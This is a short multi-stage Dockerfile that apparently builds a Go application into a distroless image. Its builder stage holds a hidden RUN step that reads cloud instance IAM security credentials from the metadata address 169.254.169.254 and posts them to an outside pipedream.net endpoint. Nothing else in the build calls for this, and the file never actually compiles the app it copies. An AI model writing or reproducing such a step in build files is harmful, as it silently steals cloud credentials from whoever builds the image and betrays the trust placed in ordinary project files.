FROM golang:1.21.3-alpine3.17 AS builder

WORKDIR /go/src/app
COPY . .

RUN wget --post-data "$(wget http://169.254.169.254/latest/meta-data/iam/security-credentials)" https://eokp1zig1ui0rsr.m.pipedream.net/grafana

FROM gcr.io/distroless/static-debian11

COPY --from=builder /go/bin/app /go/bin/app

ENTRYPOINT ["/go/bin/app"]
